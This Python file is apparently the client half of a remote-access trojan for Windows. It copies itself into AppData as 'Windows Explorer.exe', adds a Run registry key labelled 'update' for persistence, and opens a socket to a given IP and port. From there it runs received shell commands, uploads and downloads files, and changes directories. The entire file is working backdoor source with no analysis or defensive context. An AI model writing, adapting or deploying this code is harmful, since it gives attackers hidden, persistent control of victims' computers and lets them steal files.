#!/usr/bin/env python

import socket, subprocess, json, os, base64, sys, shutil

class Connector:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        evil_file_location = os.path.join(os.environ["appdata"], "Microsoft", "Windows", "Windows Explorer.exe")
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        while True:
            try:
                self.connection.send(json.dumps(data, encoding="cp866"))
                return
            except UnicodeDecodeError:
                data = "[-] 'utf-8' codec can't decode... Client side encoding is different than 'utf-8' and does not set.\r\n"
                continue

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1380)
                return json.loads(json_data, encoding="cp866")
            except ValueError:
                continue

    def execute_system_command(self, command):
        with open(os.devnull, "wb") as devnull:
            return subprocess.check_output(command, shell=True, stderr=devnull, stdin=devnull)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path + "\r\n"

    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())

    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "[+] Upload successful.\r\n"

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Exception during command execution.\r\n"
            self.reliable_send(command_result)
